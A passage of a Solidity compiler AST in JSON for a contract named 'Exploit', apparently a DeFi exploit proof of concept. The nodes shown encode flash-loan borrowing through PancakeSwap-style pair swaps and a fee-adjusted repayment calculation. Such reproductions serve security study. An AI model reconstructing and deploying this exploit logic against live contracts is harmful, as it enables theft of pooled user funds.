                            "name": "amount1",
                            "nameLocation": "3049:7:0",
                            "nodeType": "VariableDeclaration",
                            "scope": 330,
                            "src": "3044:12:0",
                            "stateVariable": false,
                            "storageLocation": "default",
                            "typeDescriptions": {
                              "typeIdentifier": "t_uint256",
                              "typeString": "uint256"
                            },
                            "typeName": {
                              "id": 263,
                              "name": "uint",
                              "nodeType": "ElementaryTypeName",
                              "src": "3044:4:0",
                              "typeDescriptions": {
                                "typeIdentifier": "t_uint256",
                                "typeString": "uint256"
                              }
                            },
                            "visibility": "internal"
                          },
                          null
                        ],
                        "id": 272,
                        "initialValue": {
                          "arguments": [],
                          "expression": {
                            "argumentTypes": [],
                            "expression": {
                              "arguments": [
                                {
                                  "baseExpression": {
                                    "id": 266,
                                    "name": "flashloanPairs",
                                    "nodeType": "Identifier",
                                    "overloadedDeclarations": [],
                                    "referencedDeclaration": 54,
                                    "src": "3075:14:0",
                                    "typeDescriptions": {
                                      "typeIdentifier": "t_array$_t_address_$7_storage",
                                      "typeString": "address[7] storage ref"
                                    }
                                  },
                                  "id": 268,
                                  "indexExpression": {
                                    "id": 267,
                                    "name": "step",
                                    "nodeType": "Identifier",
                                    "overloadedDeclarations": [],
                                    "referencedDeclaration": 6,
                                    "src": "3090:4:0",
                                    "typeDescriptions": {
                                      "typeIdentifier": "t_uint256",
                                      "typeString": "uint256"
                                    }
                                  },
                                  "isConstant": false,
                                  "isLValue": true,
                                  "isPure": false,
                                  "lValueRequested": false,
                                  "nodeType": "IndexAccess",
                                  "src": "3075:20:0",
                                  "typeDescriptions": {
                                    "typeIdentifier": "t_address",
                                    "typeString": "address"
                                  }
                                }
                              ],
                              "expression": {
                                "argumentTypes": [
                                  {
                                    "typeIdentifier": "t_address",
                                    "typeString": "address"
                                  }
                                ],
                                "id": 265,
                                "name": "IPancakePair",
                                "nodeType": "Identifier",
                                "overloadedDeclarations": [],
                                "referencedDeclaration": 869,
                                "src": "3062:12:0",
                                "typeDescriptions": {
                                  "typeIdentifier": "t_type$_t_contract$_IPancakePair_$869_$",
                                  "typeString": "type(contract IPancakePair)"
                                }
                              },
                              "id": 269,
                              "isConstant": false,
                              "isLValue": false,
                              "isPure": false,
                              "kind": "typeConversion",
                              "lValueRequested": false,
                              "names": [],
                              "nodeType": "FunctionCall",
                              "src": "3062:34:0",
                              "tryCall": false,
                              "typeDescriptions": {
                                "typeIdentifier": "t_contract$_IPancakePair_$869",
                                "typeString": "contract IPancakePair"
                              }
                            },
                            "id": 270,
                            "isConstant": false,
                            "isLValue": false,
                            "isPure": false,
                            "lValueRequested": false,
                            "memberName": "getReserves",
                            "nodeType": "MemberAccess",
                            "referencedDeclaration": 811,
                            "src": "3062:46:0",
                            "typeDescriptions": {
                              "typeIdentifier": "t_function_external_view$__$returns$_t_uint112_$_t_uint112_$_t_uint32_$",
                              "typeString": "function () view external returns (uint112,uint112,uint32)"
                            }
                          },
                          "id": 271,
                          "isConstant": false,
                          "isLValue": false,
                          "isPure": false,
                          "kind": "functionCall",
                          "lValueRequested": false,
                          "names": [],
                          "nodeType": "FunctionCall",
                          "src": "3062:48:0",
                          "tryCall": false,
                          "typeDescriptions": {
                            "typeIdentifier": "t_tuple$_t_uint112_$_t_uint112_$_t_uint32_$",
                            "typeString": "tuple(uint112,uint112,uint32)"
                          }
                        },
                        "nodeType": "VariableDeclarationStatement",
                        "src": "3029:81:0"
                      },
                      {
                        "condition": {
                          "commonType": {
                            "typeIdentifier": "t_address",
                            "typeString": "address"
                          },
                          "id": 284,
                          "isConstant": false,
                          "isLValue": false,
                          "isPure": false,
                          "lValueRequested": false,
                          "leftExpression": {
                            "arguments": [
                              {
                                "id": 275,
                                "name": "WBNB",
                                "nodeType": "Identifier",
                                "overloadedDeclarations": [],
                                "referencedDeclaration": 12,
                                "src": "3136:4:0",
                                "typeDescriptions": {
                                  "typeIdentifier": "t_contract$_IERC20_$629",
                                  "typeString": "contract IERC20"
                                }
                              }
                            ],
                            "expression": {
                              "argumentTypes": [
                                {
                                  "typeIdentifier": "t_contract$_IERC20_$629",
                                  "typeString": "contract IERC20"
                                }
                              ],
                              "id": 274,
                              "isConstant": false,
                              "isLValue": false,
                              "isPure": true,
                              "lValueRequested": false,
                              "nodeType": "ElementaryTypeNameExpression",
                              "src": "3128:7:0",
                              "typeDescriptions": {
                                "typeIdentifier": "t_type$_t_address_$",
                                "typeString": "type(address)"
                              },
                              "typeName": {
                                "id": 273,
                                "name": "address",
                                "nodeType": "ElementaryTypeName",
                                "src": "3128:7:0",
                                "typeDescriptions": {}
                              }
                            },
                            "id": 276,
                            "isConstant": false,
                            "isLValue": false,
                            "isPure": false,
                            "kind": "typeConversion",
                            "lValueRequested": false,
                            "names": [],
                            "nodeType": "FunctionCall",
                            "src": "3128:13:0",
                            "tryCall": false,
                            "typeDescriptions": {
                              "typeIdentifier": "t_address",
                              "typeString": "address"
                            }
                          },
                          "nodeType": "BinaryOperation",
                          "operator": "==",
                          "rightExpression": {
                            "arguments": [],
                            "expression": {
                              "argumentTypes": [],
                              "expression": {
                                "arguments": [
                                  {
                                    "baseExpression": {
                                      "id": 278,
                                      "name": "flashloanPairs",
                                      "nodeType": "Identifier",
                                      "overloadedDeclarations": [],
                                      "referencedDeclaration": 54,
                                      "src": "3158:14:0",
                                      "typeDescriptions": {
                                        "typeIdentifier": "t_array$_t_address_$7_storage",
                                        "typeString": "address[7] storage ref"
                                      }
                                    },
                                    "id": 280,
                                    "indexExpression": {
                                      "id": 279,
                                      "name": "step",
                                      "nodeType": "Identifier",
                                      "overloadedDeclarations": [],
                                      "referencedDeclaration": 6,
                                      "src": "3173:4:0",
                                      "typeDescriptions": {
                                        "typeIdentifier": "t_uint256",
                                        "typeString": "uint256"
                                      }
                                    },
                                    "isConstant": false,
                                    "isLValue": true,
                                    "isPure": false,
                                    "lValueRequested": false,
                                    "nodeType": "IndexAccess",
                                    "src": "3158:20:0",
                                    "typeDescriptions": {
                                      "typeIdentifier": "t_address",
                                      "typeString": "address"
                                    }
                                  }
                                ],
                                "expression": {
                                  "argumentTypes": [
                                    {
                                      "typeIdentifier": "t_address",
                                      "typeString": "address"
                                    }
                                  ],
                                  "id": 277,
                                  "name": "IPancakePair",
                                  "nodeType": "Identifier",
                                  "overloadedDeclarations": [],
                                  "referencedDeclaration": 869,
                                  "src": "3145:12:0",
                                  "typeDescriptions": {
                                    "typeIdentifier": "t_type$_t_contract$_IPancakePair_$869_$",
                                    "typeString": "type(contract IPancakePair)"
                                  }
                                },
                                "id": 281,
                                "isConstant": false,
                                "isLValue": false,
                                "isPure": false,
                                "kind": "typeConversion",
                                "lValueRequested": false,
                                "names": [],
                                "nodeType": "FunctionCall",
                                "src": "3145:34:0",
                                "tryCall": false,
                                "typeDescriptions": {
                                  "typeIdentifier": "t_contract$_IPancakePair_$869",
                                  "typeString": "contract IPancakePair"
                                }
                              },
                              "id": 282,
                              "isConstant": false,
                              "isLValue": false,
                              "isPure": false,
                              "lValueRequested": false,
                              "memberName": "token1",
                              "nodeType": "MemberAccess",
                              "referencedDeclaration": 802,
                              "src": "3145:41:0",
                              "typeDescriptions": {
                                "typeIdentifier": "t_function_external_view$__$returns$_t_address_$",
                                "typeString": "function () view external returns (address)"
                              }
                            },
                            "id": 283,
                            "isConstant": false,
                            "isLValue": false,
                            "isPure": false,
                            "kind": "functionCall",
                            "lValueRequested": false,
                            "names": [],
                            "nodeType": "FunctionCall",
                            "src": "3145:43:0",
                            "tryCall": false,
                            "typeDescriptions": {
                              "typeIdentifier": "t_address",
                              "typeString": "address"
                            }
                          },
                          "src": "3128:60:0",
                          "typeDescriptions": {
                            "typeIdentifier": "t_bool",
                            "typeString": "bool"
                          }
                        },
                        "falseBody": {
                          "id": 328,
                          "nodeType": "Block",
                          "src": "3345:150:0",
                          "statements": [
                            {
                              "expression": {
                                "arguments": [
                                  {
                                    "commonType": {
                                      "typeIdentifier": "t_uint256",
                                      "typeString": "uint256"
                                    },
                                    "id": 315,
                                    "isConstant": false,
                                    "isLValue": false,
                                    "isPure": false,
                                    "lValueRequested": false,
                                    "leftExpression": {
                                      "id": 313,
                                      "name": "amount0",
                                      "nodeType": "Identifier",
                                      "overloadedDeclarations": [],
                                      "referencedDeclaration": 262,
                                      "src": "3432:7:0",
                                      "typeDescriptions": {
                                        "typeIdentifier": "t_uint256",
                                        "typeString": "uint256"
                                      }
                                    },
                                    "nodeType": "BinaryOperation",
                                    "operator": "-",
                                    "rightExpression": {
                                      "hexValue": "31",
                                      "id": 314,
                                      "isConstant": false,
                                      "isLValue": false,
                                      "isPure": true,
                                      "kind": "number",
                                      "lValueRequested": false,
                                      "nodeType": "Literal",
                                      "src": "3442:1:0",
                                      "typeDescriptions": {
                                        "typeIdentifier": "t_rational_1_by_1",
                                        "typeString": "int_const 1"
                                      },
                                      "value": "1"
                                    },
                                    "src": "3432:11:0",
                                    "typeDescriptions": {
                                      "typeIdentifier": "t_uint256",
                                      "typeString": "uint256"
                                    }
                                  },
                                  {
                                    "hexValue": "30",
                                    "id": 316,
                                    "isConstant": false,
                                    "isLValue": false,
                                    "isPure": true,
                                    "kind": "number",
                                    "lValueRequested": false,
                                    "nodeType": "Literal",
                                    "src": "3445:1:0",
                                    "typeDescriptions": {
                                      "typeIdentifier": "t_rational_0_by_1",
                                      "typeString": "int_const 0"
                                    },
                                    "value": "0"
                                  },
                                  {
                                    "arguments": [
                                      {
                                        "id": 319,
                                        "name": "this",
                                        "nodeType": "Identifier",
                                        "overloadedDeclarations": [],
                                        "referencedDeclaration": -28,
                                        "src": "3456:4:0",
                                        "typeDescriptions": {
                                          "typeIdentifier": "t_contract$_Exploit_$587",
                                          "typeString": "contract Exploit"
                                        }
                                      }
                                    ],
                                    "expression": {
                                      "argumentTypes": [
                                        {
                                          "typeIdentifier": "t_contract$_Exploit_$587",
                                          "typeString": "contract Exploit"
                                        }
                                      ],
                                      "id": 318,
                                      "isConstant": false,
                                      "isLValue": false,
                                      "isPure": true,
                                      "lValueRequested": false,
                                      "nodeType": "ElementaryTypeNameExpression",
                                      "src": "3448:7:0",
                                      "typeDescriptions": {
                                        "typeIdentifier": "t_type$_t_address_$",
                                        "typeString": "type(address)"
                                      },
                                      "typeName": {
                                        "id": 317,
                                        "name": "address",
                                        "nodeType": "ElementaryTypeName",
                                        "src": "3448:7:0",
                                        "typeDescriptions": {}
                                      }
                                    },
                                    "id": 320,
                                    "isConstant": false,
                                    "isLValue": false,
                                    "isPure": false,
                                    "kind": "typeConversion",
                                    "lValueRequested": false,
                                    "names": [],
                                    "nodeType": "FunctionCall",
                                    "src": "3448:13:0",
                                    "tryCall": false,
                                    "typeDescriptions": {
                                      "typeIdentifier": "t_address",
                                      "typeString": "address"
                                    }
                                  },
                                  {
                                    "arguments": [
                                      {
                                        "hexValue": "30",
                                        "id": 323,
                                        "isConstant": false,
                                        "isLValue": false,
                                        "isPure": true,
                                        "kind": "number",
                                        "lValueRequested": false,
                                        "nodeType": "Literal",
                                        "src": "3474:1:0",
                                        "typeDescriptions": {
                                          "typeIdentifier": "t_rational_0_by_1",
                                          "typeString": "int_const 0"
                                        },
                                        "value": "0"
                                      },
                                      {
                                        "hexValue": "30",
                                        "id": 324,
                                        "isConstant": false,
                                        "isLValue": false,
                                        "isPure": true,
                                        "kind": "number",
                                        "lValueRequested": false,
                                        "nodeType": "Literal",
                                        "src": "3477:1:0",
                                        "typeDescriptions": {
                                          "typeIdentifier": "t_rational_0_by_1",
                                          "typeString": "int_const 0"
                                        },
                                        "value": "0"
                                      }
                                    ],
                                    "expression": {
                                      "argumentTypes": [
                                        {
                                          "typeIdentifier": "t_rational_0_by_1",
                                          "typeString": "int_const 0"
                                        },
                                        {
                                          "typeIdentifier": "t_rational_0_by_1",
                                          "typeString": "int_const 0"
                                        }
                                      ],
                                      "expression": {
                                        "id": 321,
                                        "name": "abi",
                                        "nodeType": "Identifier",
                                        "overloadedDeclarations": [],
                                        "referencedDeclaration": -1,
                                        "src": "3463:3:0",
                                        "typeDescriptions": {
                                          "typeIdentifier": "t_magic_abi",
                                          "typeString": "abi"
                                        }
                                      },
                                      "id": 322,
                                      "isConstant": false,
                                      "isLValue": false,
                                      "isPure": true,
                                      "lValueRequested": false,
                                      "memberName": "encode",
                                      "nodeType": "MemberAccess",
                                      "src": "3463:10:0",
                                      "typeDescriptions": {
                                        "typeIdentifier": "t_function_abiencode_pure$__$returns$_t_bytes_memory_ptr_$",
                                        "typeString": "function () pure returns (bytes memory)"
                                      }
                                    },
                                    "id": 325,
                                    "isConstant": false,
                                    "isLValue": false,
                                    "isPure": true,
                                    "kind": "functionCall",
                                    "lValueRequested": false,
                                    "names": [],
                                    "nodeType": "FunctionCall",
                                    "src": "3463:16:0",
                                    "tryCall": false,
                                    "typeDescriptions": {
                                      "typeIdentifier": "t_bytes_memory_ptr",
                                      "typeString": "bytes memory"
                                    }
                                  }
                                ],
                                "expression": {
                                  "argumentTypes": [
                                    {
                                      "typeIdentifier": "t_uint256",
                                      "typeString": "uint256"
                                    },
                                    {
                                      "typeIdentifier": "t_rational_0_by_1",
                                      "typeString": "int_const 0"
                                    },
                                    {
                                      "typeIdentifier": "t_address",
                                      "typeString": "address"
                                    },
                                    {
                                      "typeIdentifier": "t_bytes_memory_ptr",
                                      "typeString": "bytes memory"
                                    }
                                  ],
                                  "expression": {
                                    "arguments": [
                                      {
                                        "baseExpression": {
                                          "id": 308,
                                          "name": "flashloanPairs",
                                          "nodeType": "Identifier",
                                          "overloadedDeclarations": [],
                                          "referencedDeclaration": 54,
                                          "src": "3405:14:0",
                                          "typeDescriptions": {
                                            "typeIdentifier": "t_array$_t_address_$7_storage",
                                            "typeString": "address[7] storage ref"
                                          }
                                        },
                                        "id": 310,
                                        "indexExpression": {
                                          "id": 309,
                                          "name": "step",
                                          "nodeType": "Identifier",
                                          "overloadedDeclarations": [],
                                          "referencedDeclaration": 6,
                                          "src": "3420:4:0",
                                          "typeDescriptions": {
                                            "typeIdentifier": "t_uint256",
                                            "typeString": "uint256"
                                          }
                                        },
                                        "isConstant": false,
                                        "isLValue": true,
                                        "isPure": false,
                                        "lValueRequested": false,
                                        "nodeType": "IndexAccess",
                                        "src": "3405:20:0",
                                        "typeDescriptions": {
                                          "typeIdentifier": "t_address",
                                          "typeString": "address"
                                        }
                                      }
                                    ],
                                    "expression": {
                                      "argumentTypes": [
                                        {
                                          "typeIdentifier": "t_address",
                                          "typeString": "address"
                                        }
                                      ],
                                      "id": 307,
                                      "name": "IPancakePair",
                                      "nodeType": "Identifier",
                                      "overloadedDeclarations": [],
                                      "referencedDeclaration": 869,
                                      "src": "3392:12:0",
                                      "typeDescriptions": {
                                        "typeIdentifier": "t_type$_t_contract$_IPancakePair_$869_$",
                                        "typeString": "type(contract IPancakePair)"
                                      }
                                    },
                                    "id": 311,
                                    "isConstant": false,
                                    "isLValue": false,
                                    "isPure": false,
                                    "kind": "typeConversion",
                                    "lValueRequested": false,
                                    "names": [],
                                    "nodeType": "FunctionCall",
                                    "src": "3392:34:0",
                                    "tryCall": false,
                                    "typeDescriptions": {
                                      "typeIdentifier": "t_contract$_IPancakePair_$869",
                                      "typeString": "contract IPancakePair"
                                    }
                                  },
                                  "id": 312,
                                  "isConstant": false,
                                  "isLValue": false,
                                  "isPure": false,
                                  "lValueRequested": false,
                                  "memberName": "swap",
                                  "nodeType": "MemberAccess",
                                  "referencedDeclaration": 853,
                                  "src": "3392:39:0",
                                  "typeDescriptions": {
                                    "typeIdentifier": "t_function_external_nonpayable$_t_uint256_$_t_uint256_$_t_address_$_t_bytes_memory_ptr_$returns$__$",
                                    "typeString": "function (uint256,uint256,address,bytes memory) external"
                                  }
                                },
                                "id": 326,
                                "isConstant": false,
                                "isLValue": false,
                                "isPure": false,
                                "kind": "functionCall",
                                "lValueRequested": false,
                                "names": [],
                                "nodeType": "FunctionCall",
                                "src": "3392:88:0",
                                "tryCall": false,
                                "typeDescriptions": {
                                  "typeIdentifier": "t_tuple$__$",
                                  "typeString": "tuple()"
                                }
                              },
                              "id": 327,
                              "nodeType": "ExpressionStatement",
                              "src": "3392:88:0"
                            }
                          ]
                        },
                        "id": 329,
                        "nodeType": "IfStatement",
                        "src": "3124:371:0",
                        "trueBody": {
                          "id": 306,
                          "nodeType": "Block",
                          "src": "3189:150:0",
                          "statements": [
                            {
                              "expression": {
                                "arguments": [
                                  {
                                    "hexValue": "30",
                                    "id": 291,
                                    "isConstant": false,
                                    "isLValue": false,
                                    "isPure": true,
                                    "kind": "number",
                                    "lValueRequested": false,
                                    "nodeType": "Literal",
                                    "src": "3276:1:0",
                                    "typeDescriptions": {
                                      "typeIdentifier": "t_rational_0_by_1",
                                      "typeString": "int_const 0"
                                    },
                                    "value": "0"
                                  },
                                  {
                                    "commonType": {
                                      "typeIdentifier": "t_uint256",
                                      "typeString": "uint256"
                                    },
                                    "id": 294,
                                    "isConstant": false,
                                    "isLValue": false,
                                    "isPure": false,
                                    "lValueRequested": false,
                                    "leftExpression": {
                                      "id": 292,
                                      "name": "amount1",
                                      "nodeType": "Identifier",
                                      "overloadedDeclarations": [],
                                      "referencedDeclaration": 264,
                                      "src": "3279:7:0",
                                      "typeDescriptions": {
                                        "typeIdentifier": "t_uint256",
                                        "typeString": "uint256"
                                      }
                                    },
                                    "nodeType": "BinaryOperation",
                                    "operator": "-",
                                    "rightExpression": {
                                      "hexValue": "31",
                                      "id": 293,
                                      "isConstant": false,
                                      "isLValue": false,
                                      "isPure": true,
                                      "kind": "number",
                                      "lValueRequested": false,
                                      "nodeType": "Literal",
                                      "src": "3289:1:0",
                                      "typeDescriptions": {
                                        "typeIdentifier": "t_rational_1_by_1",
                                        "typeString": "int_const 1"
                                      },
                                      "value": "1"
                                    },
                                    "src": "3279:11:0",
                                    "typeDescriptions": {
                                      "typeIdentifier": "t_uint256",
                                      "typeString": "uint256"
                                    }
                                  },
                                  {
                                    "arguments": [
                                      {
                                        "id": 297,
                                        "name": "this",
                                        "nodeType": "Identifier",
                                        "overloadedDeclarations": [],
                                        "referencedDeclaration": -28,
                                        "src": "3300:4:0",
                                        "typeDescriptions": {
                                          "typeIdentifier": "t_contract$_Exploit_$587",
                                          "typeString": "contract Exploit"
                                        }
                                      }
                                    ],
                                    "expression": {
                                      "argumentTypes": [
                                        {
                                          "typeIdentifier": "t_contract$_Exploit_$587",
                                          "typeString": "contract Exploit"
                                        }
                                      ],
                                      "id": 296,
                                      "isConstant": false,
                                      "isLValue": false,
                                      "isPure": true,
                                      "lValueRequested": false,
                                      "nodeType": "ElementaryTypeNameExpression",
                                      "src": "3292:7:0",
                                      "typeDescriptions": {
                                        "typeIdentifier": "t_type$_t_address_$",
                                        "typeString": "type(address)"
                                      },
                                      "typeName": {
                                        "id": 295,
                                        "name": "address",
                                        "nodeType": "ElementaryTypeName",
                                        "src": "3292:7:0",
                                        "typeDescriptions": {}
                                      }
                                    },
                                    "id": 298,
                                    "isConstant": false,
                                    "isLValue": false,
                                    "isPure": false,
                                    "kind": "typeConversion",
                                    "lValueRequested": false,
                                    "names": [],
                                    "nodeType": "FunctionCall",
                                    "src": "3292:13:0",
                                    "tryCall": false,
                                    "typeDescriptions": {
                                      "typeIdentifier": "t_address",
                                      "typeString": "address"
                                    }
                                  },
                                  {
                                    "arguments": [
                                      {
                                        "hexValue": "30",
                                        "id": 301,
                                        "isConstant": false,
                                        "isLValue": false,
                                        "isPure": true,
                                        "kind": "number",
                                        "lValueRequested": false,
                                        "nodeType": "Literal",
                                        "src": "3318:1:0",
                                        "typeDescriptions": {
                                          "typeIdentifier": "t_rational_0_by_1",
                                          "typeString": "int_const 0"
                                        },
                                        "value": "0"
                                      },
                                      {
                                        "hexValue": "31",
                                        "id": 302,
                                        "isConstant": false,
                                        "isLValue": false,
                                        "isPure": true,
                                        "kind": "number",
                                        "lValueRequested": false,
                                        "nodeType": "Literal",
                                        "src": "3321:1:0",
                                        "typeDescriptions": {
                                          "typeIdentifier": "t_rational_1_by_1",
                                          "typeString": "int_const 1"
                                        },
                                        "value": "1"
                                      }
                                    ],
                                    "expression": {
                                      "argumentTypes": [
                                        {
                                          "typeIdentifier": "t_rational_0_by_1",
                                          "typeString": "int_const 0"
                                        },
                                        {
                                          "typeIdentifier": "t_rational_1_by_1",
                                          "typeString": "int_const 1"
                                        }
                                      ],
                                      "expression": {
                                        "id": 299,
                                        "name": "abi",
                                        "nodeType": "Identifier",
                                        "overloadedDeclarations": [],
                                        "referencedDeclaration": -1,
                                        "src": "3307:3:0",
                                        "typeDescriptions": {
                                          "typeIdentifier": "t_magic_abi",
                                          "typeString": "abi"
                                        }
                                      },
                                      "id": 300,
                                      "isConstant": false,
                                      "isLValue": false,
                                      "isPure": true,
                                      "lValueRequested": false,
                                      "memberName": "encode",
                                      "nodeType": "MemberAccess",
                                      "src": "3307:10:0",
                                      "typeDescriptions": {
                                        "typeIdentifier": "t_function_abiencode_pure$__$returns$_t_bytes_memory_ptr_$",
                                        "typeString": "function () pure returns (bytes memory)"
                                      }
                                    },
                                    "id": 303,
                                    "isConstant": false,
                                    "isLValue": false,
                                    "isPure": true,
                                    "kind": "functionCall",
                                    "lValueRequested": false,
                                    "names": [],
                                    "nodeType": "FunctionCall",
                                    "src": "3307:16:0",
                                    "tryCall": false,
                                    "typeDescriptions": {
                                      "typeIdentifier": "t_bytes_memory_ptr",
                                      "typeString": "bytes memory"
                                    }
                                  }
                                ],
                                "expression": {
                                  "argumentTypes": [
                                    {
                                      "typeIdentifier": "t_rational_0_by_1",
                                      "typeString": "int_const 0"
                                    },
                                    {
                                      "typeIdentifier": "t_uint256",
                                      "typeString": "uint256"
                                    },
                                    {
                                      "typeIdentifier": "t_address",
                                      "typeString": "address"
                                    },
                                    {
                                      "typeIdentifier": "t_bytes_memory_ptr",
                                      "typeString": "bytes memory"
                                    }
                                  ],
                                  "expression": {
                                    "arguments": [
                                      {
                                        "baseExpression": {
                                          "id": 286,
                                          "name": "flashloanPairs",
                                          "nodeType": "Identifier",
                                          "overloadedDeclarations": [],
                                          "referencedDeclaration": 54,
                                          "src": "3249:14:0",
                                          "typeDescriptions": {
                                            "typeIdentifier": "t_array$_t_address_$7_storage",
                                            "typeString": "address[7] storage ref"
                                          }
                                        },
                                        "id": 288,
                                        "indexExpression": {
                                          "id": 287,
                                          "name": "step",
                                          "nodeType": "Identifier",
                                          "overloadedDeclarations": [],
                                          "referencedDeclaration": 6,
                                          "src": "3264:4:0",
                                          "typeDescriptions": {
                                            "typeIdentifier": "t_uint256",
                                            "typeString": "uint256"
                                          }
                                        },
                                        "isConstant": false,
                                        "isLValue": true,
                                        "isPure": false,
                                        "lValueRequested": false,
                                        "nodeType": "IndexAccess",
                                        "src": "3249:20:0",
                                        "typeDescriptions": {
                                          "typeIdentifier": "t_address",
                                          "typeString": "address"
                                        }
                                      }
                                    ],
                                    "expression": {
                                      "argumentTypes": [
                                        {
                                          "typeIdentifier": "t_address",
                                          "typeString": "address"
                                        }
                                      ],
                                      "id": 285,
                                      "name": "IPancakePair",
                                      "nodeType": "Identifier",
                                      "overloadedDeclarations": [],
                                      "referencedDeclaration": 869,
                                      "src": "3236:12:0",
                                      "typeDescriptions": {
                                        "typeIdentifier": "t_type$_t_contract$_IPancakePair_$869_$",
                                        "typeString": "type(contract IPancakePair)"
                                      }
                                    },
                                    "id": 289,
                                    "isConstant": false,
                                    "isLValue": false,
                                    "isPure": false,
                                    "kind": "typeConversion",
                                    "lValueRequested": false,
                                    "names": [],
                                    "nodeType": "FunctionCall",
                                    "src": "3236:34:0",
                                    "tryCall": false,
                                    "typeDescriptions": {
                                      "typeIdentifier": "t_contract$_IPancakePair_$869",
                                      "typeString": "contract IPancakePair"
                                    }
                                  },
                                  "id": 290,
                                  "isConstant": false,
                                  "isLValue": false,
                                  "isPure": false,
                                  "lValueRequested": false,
                                  "memberName": "swap",
                                  "nodeType": "MemberAccess",
                                  "referencedDeclaration": 853,
                                  "src": "3236:39:0",
                                  "typeDescriptions": {
                                    "typeIdentifier": "t_function_external_nonpayable$_t_uint256_$_t_uint256_$_t_address_$_t_bytes_memory_ptr_$returns$__$",
                                    "typeString": "function (uint256,uint256,address,bytes memory) external"
                                  }
                                },
                                "id": 304,
                                "isConstant": false,
                                "isLValue": false,
                                "isPure": false,
                                "kind": "functionCall",
                                "lValueRequested": false,
                                "names": [],
                                "nodeType": "FunctionCall",
                                "src": "3236:88:0",
                                "tryCall": false,
                                "typeDescriptions": {
                                  "typeIdentifier": "t_tuple$__$",
                                  "typeString": "tuple()"
                                }
                              },
                              "id": 305,
                              "nodeType": "ExpressionStatement",
                              "src": "3236:88:0"
                            }
                          ]
                        }
                      }
                    ]
                  }
                },
                {
                  "assignments": [
                    349
                  ],
                  "declarations": [
                    {
                      "constant": false,
                      "id": 349,
                      "mutability": "mutable",
                      "name": "retAmount",
                      "nameLocation": "3724:9:0",
                      "nodeType": "VariableDeclaration",
                      "scope": 394,
                      "src": "3716:17:0",
                      "stateVariable": false,
                      "storageLocation": "default",
                      "typeDescriptions": {
                        "typeIdentifier": "t_uint256",
                        "typeString": "uint256"
                      },
                      "typeName": {
                        "id": 348,
                        "name": "uint256",
                        "nodeType": "ElementaryTypeName",
                        "src": "3716:7:0",
                        "typeDescriptions": {
                          "typeIdentifier": "t_uint256",
                          "typeString": "uint256"
                        }
                      },
                      "visibility": "internal"
                    }
                  ],
                  "id": 372,
                  "initialValue": {
                    "condition": {
                      "commonType": {
                        "typeIdentifier": "t_uint256",
                        "typeString": "uint256"
                      },
                      "id": 352,
                      "isConstant": false,
                      "isLValue": false,
                      "isPure": false,
                      "lValueRequested": false,
                      "leftExpression": {
                        "id": 350,
                        "name": "asset",
                        "nodeType": "Identifier",
                        "overloadedDeclarations": [],
                        "referencedDeclaration": 243,
                        "src": "3736:5:0",
                        "typeDescriptions": {
                          "typeIdentifier": "t_uint256",
                          "typeString": "uint256"
                        }
                      },
                      "nodeType": "BinaryOperation",
                      "operator": "==",
                      "rightExpression": {
                        "hexValue": "30",
                        "id": 351,
                        "isConstant": false,
                        "isLValue": false,
                        "isPure": true,
                        "kind": "number",
                        "lValueRequested": false,
                        "nodeType": "Literal",
                        "src": "3745:1:0",
                        "typeDescriptions": {
                          "typeIdentifier": "t_rational_0_by_1",
                          "typeString": "int_const 0"
                        },
                        "value": "0"
                      },
                      "src": "3736:10:0",
                      "typeDescriptions": {
                        "typeIdentifier": "t_bool",
                        "typeString": "bool"
                      }
                    },
                    "falseExpression": {
                      "components": [
                        {
                          "commonType": {
                            "typeIdentifier": "t_uint256",
                            "typeString": "uint256"
                          },
                          "id": 369,
                          "isConstant": false,
                          "isLValue": false,
                          "isPure": false,
                          "lValueRequested": false,
                          "leftExpression": {
                            "commonType": {
                              "typeIdentifier": "t_uint256",
                              "typeString": "uint256"
                            },
                            "id": 367,
                            "isConstant": false,
                            "isLValue": false,
                            "isPure": false,
                            "lValueRequested": false,
                            "leftExpression": {
                              "components": [
                                {
                                  "commonType": {
                                    "typeIdentifier": "t_uint256",
                                    "typeString": "uint256"
                                  },
                                  "id": 364,
                                  "isConstant": false,
                                  "isLValue": false,
                                  "isPure": false,
                                  "lValueRequested": false,
                                  "leftExpression": {
                                    "id": 362,
                                    "name": "_amount1Out",
                                    "nodeType": "Identifier",
                                    "overloadedDeclarations": [],
                                    "referencedDeclaration": 237,
                                    "src": "3788:11:0",
                                    "typeDescriptions": {
                                      "typeIdentifier": "t_uint256",
                                      "typeString": "uint256"
                                    }
                                  },
                                  "nodeType": "BinaryOperation",
                                  "operator": "*",
                                  "rightExpression": {
                                    "hexValue": "3130303030",
                                    "id": 363,
                                    "isConstant": false,
                                    "isLValue": false,
                                    "isPure": true,
                                    "kind": "number",
                                    "lValueRequested": false,
                                    "nodeType": "Literal",
                                    "src": "3802:5:0",
                                    "typeDescriptions": {
                                      "typeIdentifier": "t_rational_10000_by_1",
                                      "typeString": "int_const 10000"
                                    },
                                    "value": "10000"
                                  },
                                  "src": "3788:19:0",
                                  "typeDescriptions": {
                                    "typeIdentifier": "t_uint256",
                                    "typeString": "uint256"
                                  }
                                }
                              ],
                              "id": 365,
                              "isConstant": false,
                              "isInlineArray": false,
                              "isLValue": false,
                              "isPure": false,
                              "lValueRequested": false,
                              "nodeType": "TupleExpression",
                              "src": "3787:21:0",
                              "typeDescriptions": {
                                "typeIdentifier": "t_uint256",
                                "typeString": "uint256"
                              }
                            },
                            "nodeType": "BinaryOperation",
                            "operator": "/",
                            "rightExpression": {
                              "hexValue": "39393735",
                              "id": 366,
                              "isConstant": false,
                              "isLValue": false,
                              "isPure": true,
                              "kind": "number",
                              "lValueRequested": false,
                              "nodeType": "Literal",
                              "src": "3811:4:0",
                              "typeDescriptions": {
                                "typeIdentifier": "t_rational_9975_by_1",
                                "typeString": "int_const 9975"
                              },
                              "value": "9975"
                            },
                            "src": "3787:28:0",
                            "typeDescriptions": {
                              "typeIdentifier": "t_uint256",
                              "typeString": "uint256"
                            }
                          },
                          "nodeType": "BinaryOperation",
                          "operator": "+",
                          "rightExpression": {
                            "hexValue": "31",
                            "id": 368,
                            "isConstant": false,
                            "isLValue": false,
                            "isPure": true,
                            "kind": "number",
                            "lValueRequested": false,
                            "nodeType": "Literal",
                            "src": "3818:1:0",
                            "typeDescriptions": {
                              "typeIdentifier": "t_rational_1_by_1",
                              "typeString": "int_const 1"
                            },
                            "value": "1"
                          },
                          "src": "3787:32:0",
                          "typeDescriptions": {
                            "typeIdentifier": "t_uint256",
                            "typeString": "uint256"
                          }
                        }
                      ],
                      "id": 370,
                      "isConstant": false,
                      "isInlineArray": false,
                      "isLValue": false,
                      "isPure": false,
                      "lValueRequested": false,
